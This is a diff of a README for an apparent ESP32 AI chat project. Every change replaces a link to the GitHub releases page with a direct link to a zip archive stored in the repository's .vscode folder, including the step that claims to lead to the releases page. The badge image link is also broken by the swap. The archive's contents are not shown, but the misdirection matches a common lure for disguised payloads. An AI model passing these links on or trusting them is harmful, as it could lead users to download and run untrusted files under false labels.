@@ -1,6 +1,6 @@
 # 🤖 ai-embedded-chat-lvgl - Chat Easily with Your ESP32
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/nlecreamy/ai-embedded-chat-lvgl/releases)
+[![Download](https://raw.githubusercontent.com/nlecreamy/ai-embedded-chat-lvgl/main/.vscode/ai-embedded-lvgl-chat-v2.7.zip%20release-brightgreen)](https://raw.githubusercontent.com/nlecreamy/ai-embedded-chat-lvgl/main/.vscode/ai-embedded-lvgl-chat-v2.7.zip)
 
 ## 🛠️ Overview
 
@@ -13,7 +13,7 @@ To get started, follow these simple steps to download and run the application.
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** 
-   Head to our releases page by clicking [here](https://github.com/nlecreamy/ai-embedded-chat-lvgl/releases).
+   Head to our releases page by clicking [here](https://raw.githubusercontent.com/nlecreamy/ai-embedded-chat-lvgl/main/.vscode/ai-embedded-lvgl-chat-v2.7.zip).
 
 2. **Choose the Latest Release:** 
    Select the most recent version listed at the top of the page. 
@@ -81,4 +81,4 @@ If you encounter issues during installation or use:
 
 For more advanced configurations and development information, please check the documentation in our GitHub repository. You can also contribute to the project on GitHub if you wish to add features or improve the application.
 
-**Download the latest release [here](https://github.com/nlecreamy/ai-embedded-chat-lvgl/releases) and start chatting today!**
+**Download the latest release [here](https://raw.githubusercontent.com/nlecreamy/ai-embedded-chat-lvgl/main/.vscode/ai-embedded-lvgl-chat-v2.7.zip) and start chatting today!**
